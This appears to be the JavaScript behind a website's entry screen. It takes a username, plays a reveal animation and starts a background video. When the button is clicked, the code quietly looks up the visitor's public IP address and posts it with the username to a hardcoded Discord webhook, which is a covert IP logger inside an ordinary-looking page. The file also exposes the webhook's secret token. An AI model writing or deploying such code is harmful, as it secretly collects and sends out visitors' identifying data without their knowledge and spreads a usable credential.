document.addEventListener("DOMContentLoaded", () => {
    const enterBtn = document.getElementById('enter-world-btn');
    const input = document.getElementById('username-input');
    const entryScreen = document.getElementById('entry-screen');
    const mainContent = document.getElementById('main-content');
    const bgVideo = document.getElementById('bg-video');

    
    const webhookURL = "https://discord.com/api/webhooks/1530408235788406916/x5HnEENLDmM4Gr1gZtsYEEmRJ6Yb9mE6SLMmf77-oY0e56N48egBDELQsMSLQ6Hwpsmt";

    function revealWorld() {
        entryScreen.style.opacity = '0';
        mainContent.style.display = 'flex';
        bgVideo.play().catch(e => console.log("Video play error:", e));

        setTimeout(() => {
            entryScreen.style.display = 'none';
        }, 1500); 
    }

    enterBtn.addEventListener('click', async () => {
        const username = input.value.trim();
        
        if (!username) {
            input.style.borderBottom = "1px solid red";
            setTimeout(() => { input.style.borderBottom = "1px solid #333"; }, 1000);
            return;
        }

       
        revealWorld();

       
        try {
           
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            const ipAddress = ipData.ip;

            
            const payload = {
                content: `🚨 **New Visitor** 🚨\n**Username:** \`${username}\`\n**IP Address:** \`${ipAddress}\``
            };

            await fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            console.log("Data sent to webhook.");
        } catch (error) {
            console.error("Webhook failed:", error);
        }
    });
});